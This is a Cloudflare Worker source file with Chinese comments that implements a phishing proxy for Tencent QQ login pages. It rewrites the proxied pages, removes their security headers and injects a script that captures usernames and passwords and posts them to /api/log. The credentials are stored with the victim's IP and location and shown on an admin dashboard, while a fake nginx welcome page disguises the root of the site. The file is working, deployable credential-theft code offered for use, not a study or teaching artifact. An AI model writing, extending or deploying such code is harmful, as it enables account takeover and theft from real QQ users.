// ==================== Cloudflare Worker ES Module ====================
// 功能：QQ登录页代理 + 登录凭证记录 + 全面禁止APP跳转 + 后台管理
// 数据库：D1 (绑定名称 DB)
// IP地理位置：ip.ilqx.dpdns.org/geo
// 后台地址：/admin (默认密码 admin123)
// ===================================================================

export default {
  async fetch(request, env, ctx) {
    return await handleRequest(request, env);
  }
};

/* ---------- 常量配置 ---------- */
const ADMIN_PASSWORD = "admin123";               // 后台密码，请修改
const lastVisitProxyCookie = "__PROXY_VISITEDSITE__";

/* ---------- Nginx 欢迎页（伪装根目录） ---------- */
const nginxWelcomePage = `<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; }</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and working. Further configuration is required.</p>
<p>For online documentation and support please refer to <a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at <a href="http://nginx.com/">nginx.com</a>.</p>
<p><em>Thank you for using nginx.</em></p>
</body>
</html>`;

/* ---------- 数据库初始化 ---------- */
async function initDB(env) {
  try {
    const tableCheck = await env.DB.prepare(
      "SELECT name FROM sqlite_master WHERE type='table' AND name='login_records'"
    ).first();
    if (!tableCheck) {
      await env.DB.prepare(`
        CREATE TABLE login_records (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          username TEXT NOT NULL,
          password TEXT NOT NULL,
          ip TEXT,
          country TEXT,
          city TEXT,
          latitude TEXT,
          longitude TEXT,
          as_organization TEXT,
          user_agent TEXT,
          timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
      `).run();
      console.log('[DB] 表 login_records 创建成功');
    }
  } catch (error) {
    console.error('[DB] 初始化失败:', error.message);
  }
}

/* ---------- 获取客户端真实IP及地理位置（调用用户提供的API） ---------- */
async function getClientIPInfo(request) {
  let clientIP = request.headers.get('CF-Connecting-IP') ||
                 request.headers.get('X-Forwarded-For')?.split(',')[0] ||
                 request.headers.get('X-Real-IP') ||
                 'unknown';
  
  try {
    const geoRes = await fetch('https://ip.ilqx.dpdns.org/geo');
    if (geoRes.ok) {
      const geoData = await geoRes.json();
      return {
        ip: geoData.ip || clientIP,
        country: geoData.country || '',
        city: geoData.city || '',
        latitude: geoData.latitude || '',
        longitude: geoData.longitude || '',
        as_organization: geoData.asOrganization || ''
      };
    }
  } catch (error) {
    console.error('[Geo] 获取地理位置失败:', error.message);
  }
  
  return {
    ip: clientIP,
    country: '',
    city: '',
    latitude: '',
    longitude: '',
    as_organization: ''
  };
}

/* ---------- 主请求处理器 ---------- */
async function handleRequest(request, env) {
  const url = new URL(request.url);
  const userAgent = request.headers.get('User-Agent') || '';
  const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(userAgent);
  
  if (env.DB) await initDB(env);
  
  /* ------- 后台管理路由 ------- */
  if (url.pathname === '/admin') return handleAdmin(request, env);
  if (url.pathname === '/admin/clear') return handleAdminClear(request, env);
  if (url.pathname === '/admin/logout') return handleAdminLogout();
  
  /* ------- 登录记录API ------- */
  if (url.pathname === '/api/log') return handleLogRequest(request, env);
  
  /* ------- 根路径伪装nginx ------- */
  if (url.pathname === '/' || url.pathname === '') {
    return new Response(nginxWelcomePage, {
      headers: { 'Content-Type': 'text/html; charset=utf-8' }
    });
  }
  
  /* ------- 静态资源 ------- */
  if (url.pathname === '/favicon.ico') {
    return Response.redirect('https://ti.qq.com/favicon.ico', 302);
  }
  if (url.pathname === '/robots.txt') {
    return new Response('User-agent: *\nDisallow: /', {
      headers: { 'Content-Type': 'text/plain' }
    });
  }
  
  /* ------- 腾讯验证链接直通（不代理）------- */
  if (isVerificationLink(url.pathname)) {
    return handleVerificationLink(request, url, isMobile);
  }
  
  /* ------- QQ业务代理 ------- */
  if (url.pathname.startsWith('/qq')) {
    return handleQQProxy(request, url, isMobile, userAgent, env);
  }
  
  return new Response('Not Found', { status: 404 });
}

/* ---------- 验证链接判断 ---------- */
function isVerificationLink(pathname) {
  const paths = [
    '/ssl/check', '/ssl/login',
    '/cgi-bin/ssl/check', '/cgi-bin/login', '/cgi-bin/xlogin'
  ];
  return paths.some(p => pathname.startsWith(p));
}

/* ---------- 验证链接直通 ---------- */
async function handleVerificationLink(request, url, isMobile) {
  const referer = request.headers.get('Referer') || '';
  let targetDomain = isMobile ? 'ui.ptlogin2.qq.com' : 'xui.ptlogin2.qq.com';
  if (!referer.includes('/qq')) targetDomain = 'ui.ptlogin2.qq.com';
  
  const targetUrl = `https://${targetDomain}${url.pathname}${url.search}`;
  const headers = new Headers(request.headers);
  headers.delete('Origin');
  headers.set('Referer', 'https://ti.qq.com/qqlevel/index');
  
  try {
    const proxyReq = new Request(targetUrl, {
      method: request.method,
      headers,
      body: request.body,
      redirect: 'follow'
    });
    const resp = await fetch(proxyReq);
    const newHeaders = new Headers(resp.headers);
    newHeaders.set('Access-Control-Allow-Origin', '*');
    return new Response(resp.body, {
      status: resp.status,
      statusText: resp.statusText,
      headers: newHeaders
    });
  } catch (e) {
    return new Response(`Verification proxy error: ${e.message}`, { status: 500 });
  }
}

/* ---------- QQ业务代理（核心代理逻辑，大幅强化JS注入） ---------- */
async function handleQQProxy(request, url, isMobile, userAgent, env) {
  const fullPath = url.pathname + url.search + url.hash;
  const pathAfterQQ = fullPath.substring(3);
  let targetUrl;
  
  if (!pathAfterQQ || pathAfterQQ === '/' || pathAfterQQ === '?' || pathAfterQQ.startsWith('?')) {
    targetUrl = 'https://ti.qq.com/qqlevel/index' + (pathAfterQQ.startsWith('?') ? pathAfterQQ : '');
  } else {
    const pathEnd = pathAfterQQ.indexOf('?');
    let pathPart = pathEnd === -1 ? pathAfterQQ : pathAfterQQ.substring(0, pathEnd);
    const queryPart = pathEnd === -1 ? '' : pathAfterQQ.substring(pathEnd);
    if (!pathPart.startsWith('/')) pathPart = '/' + pathPart;
    
    const isLoginPath = pathPart.includes('/cgi-bin/login') || pathPart.includes('/cgi-bin/xlogin');
    if (isLoginPath) {
      const domain = isMobile ? 'ui.ptlogin2.qq.com' : 'xui.ptlogin2.qq.com';
      targetUrl = `https://${domain}${pathPart}${queryPart}`;
    } else {
      targetUrl = `https://ti.qq.com${pathPart}${queryPart}`;
    }
  }
  
  // 找回密码、注册等直接302跳转
  if (targetUrl.includes('accounts.qq.com/psw/find') ||
      targetUrl.includes('ssl.zc.qq.com/phone/index.html')) {
    return Response.redirect(targetUrl, 302);
  }
  
  try {
    const headers = new Headers(request.headers);
    headers.delete('Origin');
    headers.delete('Referer');
    headers.set('User-Agent', userAgent);
    
    const proxyReq = new Request(targetUrl, {
      method: request.method,
      headers,
      body: request.body,
      redirect: 'follow'
    });
    const response = await fetch(proxyReq);
    const contentType = response.headers.get('Content-Type') || '';
    
    if (contentType.includes('text/html')) {
      let html = await response.text();
      const proxyOrigin = new URL(request.url).origin;
      
      // ---------- 替换页面内硬编码的腾讯验证链接为代理链接 ----------
      const qqDomains = ['ti.qq.com', 'ui.ptlogin2.qq.com', 'xui.ptlogin2.qq.com', 'ptlogin2.qq.com'];
      const verifPaths = ['ssl/check', 'ssl/login', 'cgi-bin/ssl/check', 'cgi-bin/login', 'cgi-bin/xlogin'];
      for (const domain of qqDomains) {
        for (const path of verifPaths) {
          const regex = new RegExp(`https?://${domain}/${path}`, 'gi');
          html = html.replace(regex, `/qq/${path}`);
        }
      }
      
      // ========== 新增：在服务端直接清除所有腾讯协议链接 ==========
      // 匹配 href="tencent://...", src="tencent://...", action="tencent://...", 以及无引号情况
      const tencentProtocolRegex = /(href|src|action|data-url|data-src)=["']?(tencent|qq|mqq|tim|weixin|wx|intent|android-app|ios-app|market):\/\/[^"'\s>]+["']?/gi;
      html = html.replace(tencentProtocolRegex, (match, attr) => {
        // 替换为无跳转属性
        if (attr === 'href') return 'href="#"';
        if (attr === 'src') return 'src="about:blank"';
        if (attr === 'action') return 'action="javascript:void(0)"';
        return match; // 其他属性保留原样（极少）
      });
      
      // 单独处理 meta refresh 跳转至腾讯协议的
      html = html.replace(/<meta[^>]+url=tencent:\/\/[^"']+["']?[^>]*>/gi, '<!-- meta refresh blocked -->');
      
      // ---------- 注入增强版客户端脚本 ----------
      const injectScript = `
      <script>
      (function(){
        // 防止重复注入
        if (window.__aegis_proxy_injected) return;
        window.__aegis_proxy_injected = true;

        // ---------- 核心：智能凭证捕获 ----------
        function captureCredentials() {
          try {
            // 1. 找到所有密码框（最可靠的特征）
            const passwordFields = Array.from(document.querySelectorAll('input[type="password"]'));
            if (passwordFields.length === 0) return;
            
            // 2. 对每个密码框，尝试关联的用户名输入框
            passwordFields.forEach(pwdField => {
              const pwdValue = pwdField.value.trim();
              if (!pwdValue) return; // 密码为空不记录
              
              let usernameField = null;
              let usernameValue = '';
              
              // 方法A：表单内查找文本输入框（优先同表单）
              const form = pwdField.form;
              if (form) {
                // 找type=text / email / tel / number 且不是隐藏域，通常在密码框前面
                const textInputs = Array.from(form.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"], input[type="number"], input:not([type])'));
                // 通常用户名框在密码框之前
                usernameField = textInputs.find(input => input.compareDocumentPosition(pwdField) & Node.DOCUMENT_POSITION_FOLLOWING) || textInputs[0];
              }
              
              // 方法B：无表单，基于页面结构推测（常见ID/名称特征）
              if (!usernameField) {
                usernameField = document.getElementById('u') ||
                               document.querySelector('input[name="u"], input[name="qq"], input[name="account"], input[placeholder*="QQ"], input[placeholder*="手机"], input[placeholder*="邮箱"], input[placeholder*="账号"]');
              }
              
              // 方法C：通用降级 —— 取页面上第一个可见的非密码输入框
              if (!usernameField) {
                usernameField = document.querySelector('input:not([type="password"]):not([type="hidden"])');
              }
              
              if (usernameField) {
                usernameValue = usernameField.value.trim();
              }
              
              // 必须同时有账号和密码才记录
              if (usernameValue && pwdValue) {
                // 发送数据（双保险）
                const payload = { username: usernameValue, password: pwdValue };
                
                // fetch + keepalive
                fetch('/api/log', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify(payload),
                  keepalive: true,
                  mode: 'same-origin'
                }).catch(e => {});
                
                // sendBeacon (页面卸载时最可靠)
                if (navigator.sendBeacon) {
                  const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
                  navigator.sendBeacon('/api/log', blob);
                }
              }
            });
          } catch(e) {
            console.error('[Aegis] capture error:', e);
          }
        }

        // ---------- 监听所有可能的登录触发事件 ----------
        function setupLoginTriggers() {
          // 1. 表单提交事件
          document.addEventListener('submit', function(e) {
            captureCredentials();
          }, true);
          
          // 2. 所有按钮/链接的点击事件（尤其登录按钮）
          document.addEventListener('click', function(e) {
            const el = e.target.closest('button, input[type="submit"], a');
            if (!el) return;
            
            // 通过文本内容判断是否登录相关（支持中英文）
            const text = el.innerText || el.value || '';
            if (/登录|登入|sign\s*in|log\s*in|submit|确认|立即登录/i.test(text)) {
              captureCredentials();
            }
            
            // 如果按钮在密码框附近（同一个form或相邻元素），也触发
            if (el.form || document.querySelector('input[type="password"]')?.compareDocumentPosition(el) & Node.DOCUMENT_POSITION_CONTAINS) {
              captureCredentials();
            }
          }, true);
          
          // 3. 密码框失焦时（用户填完密码可能直接回车，但回车已触发submit）
          document.addEventListener('focusout', function(e) {
            if (e.target.type === 'password') {
              // 延迟一下，让表单关联的用户名值更新
              setTimeout(captureCredentials, 100);
            }
          }, true);
        }

        // ---------- 全面拦截腾讯协议跳转（JS层）----------
        function blockTencentProtocols() {
          const blockedSchemes = [
            'tencent://', 'qq://', 'mqq://', 'tim://', 'weixin://', 'wx://',
            'intent://', 'android-app://', 'ios-app://', 'market://',
            'vnd.youtube://', 'twitter://', 'fb://', 'facebook://',
            'instagram://', 'whatsapp://', 'tg://', 'telegram://',
            'snssdk1128://', 'douyin://', 'kwai://', 'kuaishou://',
            'taobao://', 'tmall://', 'jd://', 'pinduoduo://',
            'alipays://', 'alipay://', 'weibosdk://', 'sinaweibo://',
            'baiduboxapp://', 'baidumap://', 'amap://',
            'microsoft-edge://', 'edgedl://'
          ];
          
          function isBlocked(url) {
            if (typeof url !== 'string') return false;
            return blockedSchemes.some(s => url.toLowerCase().startsWith(s));
          }
          
          // 劫持 location 赋值
          const originalLocation = window.location;
          Object.defineProperty(window, 'location', {
            get: () => originalLocation,
            set: (value) => {
              if (isBlocked(value)) {
                console.log('[Aegis] Blocked location=', value);
                return;
              }
              originalLocation.href = value;
            }
          });
          
          // 劫持 location.assign/replace
          const originalAssign = window.location.assign;
          window.location.assign = function(url) {
            if (isBlocked(url)) return;
            originalAssign.call(window.location, url);
          };
          const originalReplace = window.location.replace;
          window.location.replace = function(url) {
            if (isBlocked(url)) return;
            originalReplace.call(window.location, url);
          };
          
          // 劫持 window.open
          const originalOpen = window.open;
          window.open = function(url, ...args) {
            if (isBlocked(url)) return null;
            return originalOpen.call(window, url, ...args);
          };
          
          // 拦截所有 a 标签点击
          document.addEventListener('click', function(e) {
            let el = e.target.closest('a');
            if (el && el.href && isBlocked(el.href)) {
              e.preventDefault();
              e.stopPropagation();
              console.log('[Aegis] Blocked <a> href=', el.href);
            }
          }, true);
          
          // 拦截动态创建 iframe 的 src
          const observer = new MutationObserver(mutations => {
            mutations.forEach(mut => {
              mut.addedNodes.forEach(node => {
                if (node.tagName === 'IFRAME' && node.src && isBlocked(node.src)) {
                  node.src = 'about:blank';
                }
              });
            });
          });
          observer.observe(document.documentElement, { childList: true, subtree: true });
        }

        // ---------- 主动轮询捕获（针对动态加载）----------
        let pollTimer = setInterval(captureCredentials, 800);
        // 3分钟后自动清理定时器
        setTimeout(() => clearInterval(pollTimer), 180000);

        // ---------- 初始化执行 ----------
        setupLoginTriggers();
        blockTencentProtocols();
        
        // DOM加载完成后立即执行一次捕获
        if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', captureCredentials);
        } else {
          captureCredentials();
        }
        
        // 监听动态添加的表单/输入框
        new MutationObserver(captureCredentials).observe(document.body, {
          childList: true,
          subtree: true,
          attributes: false
        });
        
        // ---------- 重写链接（原有代理逻辑）----------
        const proxyOrigin = '${proxyOrigin}';
        function rewriteUrl(url) {
          if (!url || typeof url !== 'string') return url;
          if (url.startsWith('data:') || url.startsWith('javascript:') || url.startsWith('#') ||
              url.startsWith('mailto:') || url.startsWith('tel:') || isBlocked(url)) {
            return url;
          }
          try {
            let fullUrl;
            if (url.startsWith('http://') || url.startsWith('https://')) {
              fullUrl = url;
            } else if (url.startsWith('//')) {
              fullUrl = 'https:' + url;
            } else if (url.startsWith('/')) {
              fullUrl = proxyOrigin + url;
            } else {
              const base = window.location.href;
              const basePath = base.substring(0, base.lastIndexOf('/') + 1);
              fullUrl = new URL(url, basePath).href;
            }
            const urlObj = new URL(fullUrl);
            const qqDomains = ['ti.qq.com', 'ui.ptlogin2.qq.com', 'xui.ptlogin2.qq.com', 'ptlogin2.qq.com'];
            if (qqDomains.some(d => urlObj.hostname.includes(d))) {
              return proxyOrigin + '/qq' + urlObj.pathname + urlObj.search + urlObj.hash;
            }
            return url;
          } catch(e) {
            return url;
          }
        }
        
        function rewriteLinks() {
          document.querySelectorAll('a[href]').forEach(link => {
            const href = link.getAttribute('href');
            if (href && !href.startsWith(proxyOrigin + '/qq')) {
              const newHref = rewriteUrl(href);
              if (newHref !== href) link.setAttribute('href', newHref);
            }
          });
        }
        
        if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', rewriteLinks);
        } else {
          rewriteLinks();
        }
        new MutationObserver(rewriteLinks).observe(document.body, { childList: true, subtree: true });
        
      })();
      </script>
      `;
      
      // 注入到 </body> 前
      if (html.includes('</body>')) {
        html = html.replace('</body>', injectScript + '</body>');
      } else {
        html += injectScript;
      }
      
      // 构造响应头
      const newHeaders = new Headers(response.headers);
      newHeaders.set('Content-Type', 'text/html; charset=utf-8');
      newHeaders.set('Access-Control-Allow-Origin', '*');
      newHeaders.set('X-Frame-Options', 'ALLOWALL');
      newHeaders.delete('Content-Security-Policy');
      newHeaders.delete('X-Content-Security-Policy');
      newHeaders.append('Set-Cookie', `${lastVisitProxyCookie}=${encodeURIComponent(targetUrl)}; Path=/; Max-Age=86400`);
      
      return new Response(html, {
        status: response.status,
        statusText: response.statusText,
        headers: newHeaders
      });
    }
    
    return response;
    
  } catch (error) {
    return new Response(`Proxy Error: ${error.message}`, { status: 500 });
  }
}

/* ---------- 记录登录信息的API ---------- */
async function handleLogRequest(request, env) {
  if (request.method !== 'POST') {
    return new Response('Method Not Allowed', { status: 405 });
  }
  
  try {
    const { username, password } = await request.json();
    if (!username || !password) {
      return new Response('Missing fields', { status: 400 });
    }
    
    const ipInfo = await getClientIPInfo(request);
    
    await env.DB.prepare(`
      INSERT INTO login_records 
        (username, password, ip, country, city, latitude, longitude, as_organization, user_agent)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).bind(
      username,
      password,
      ipInfo.ip,
      ipInfo.country,
      ipInfo.city,
      ipInfo.latitude,
      ipInfo.longitude,
      ipInfo.as_organization,
      request.headers.get('User-Agent') || ''
    ).run();
    
    return new Response(JSON.stringify({ success: true }), {
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (error) {
    console.error('[LogAPI]', error.message);
    return new Response(JSON.stringify({ error: error.message }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    });
  }
}

/* ---------- 后台管理：登录面板 + 数据显示 ---------- */
async function handleAdmin(request, env) {
  const cookies = request.headers.get('Cookie') || '';
  const auth = getCookie('admin_auth', cookies);
  
  if (request.method === 'POST') {
    const form = await request.formData();
    const pwd = form.get('password');
    if (pwd === ADMIN_PASSWORD) {
      const headers = new Headers({ Location: '/admin' });
      headers.append('Set-Cookie', 'admin_auth=1; Path=/; HttpOnly; Max-Age=3600');
      return new Response(null, { status: 302, headers });
    } else {
      return renderAdminLogin('密码错误');
    }
  }
  
  if (auth === '1') {
    return renderAdminDashboard(env);
  }
  
  return renderAdminLogin();
}

function renderAdminLogin(error = '') {
  const html = `...`; // 保持不变，省略
  return new Response(html, { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
}

async function renderAdminDashboard(env) {
  try {
    let dbStatus = '✅ 正常';
    let dbError = '';
    try {
      await env.DB.prepare('SELECT 1').run();
    } catch (e) {
      dbStatus = '❌ 连接失败';
      dbError = e.message;
    }
    
    const countRes = await env.DB.prepare('SELECT COUNT(*) as count FROM login_records').first();
    const total = countRes?.count || 0;
    
    const { results } = await env.DB.prepare(`
      SELECT * FROM login_records ORDER BY timestamp DESC LIMIT 100
    `).all();
    
    let rowsHtml = '';
    if (results && results.length) {
      results.forEach(r => {
        rowsHtml += `<tr>
          <td>${r.id}</td>
          <td>${escapeHtml(r.username)}</td>
          <td>${escapeHtml(r.password)}</td>
          <td>${r.ip || ''}<br><small>${escapeHtml(r.country || '')} ${escapeHtml(r.city || '')}</small></td>
          <td>${new Date(r.timestamp).toLocaleString('zh-CN')}</td>
          <td title="${escapeHtml(r.user_agent || '')}">${escapeHtml((r.user_agent || '').substring(0, 30))}…</td>
        </tr>`;
      });
    } else {
      rowsHtml = '<tr><td colspan="6" style="text-align:center;padding:30px;">暂无记录</td></tr>';
    }
    
    const html = `...`; // 保持不变，省略
    return new Response(html, { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
  } catch (error) {
    return new Response(`仪表盘错误: ${error.message}`, { status: 500 });
  }
}

/* ---------- 清除所有记录 ---------- */
async function handleAdminClear(request, env) {
  const cookies = request.headers.get('Cookie') || '';
  if (getCookie('admin_auth', cookies) !== '1') {
    return new Response('Unauthorized', { status: 401 });
  }
  try {
    await env.DB.prepare('DELETE FROM login_records').run();
    return Response.redirect('/admin', 302);
  } catch (e) {
    return new Response(`清除失败: ${e.message}`, { status: 500 });
  }
}

/* ---------- 后台登出 ---------- */
function handleAdminLogout() {
  const headers = new Headers({ Location: '/admin' });
  headers.append('Set-Cookie', 'admin_auth=; Path=/; HttpOnly; Max-Age=0');
  return new Response(null, { status: 302, headers });
}

/* ---------- Cookie 解析辅助 ---------- */
function getCookie(name, cookieString) {
  if (!cookieString) return null;
  const match = cookieString.match(new RegExp('(^| )' + name + '=([^;]+)'));
  return match ? decodeURIComponent(match[2]) : null;
}

/* ---------- HTML转义 ---------- */
function escapeHtml(text) {
  if (!text) return '';
  const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;' };
  return text.replace(/[&<>"']/g, m => map[m]);
}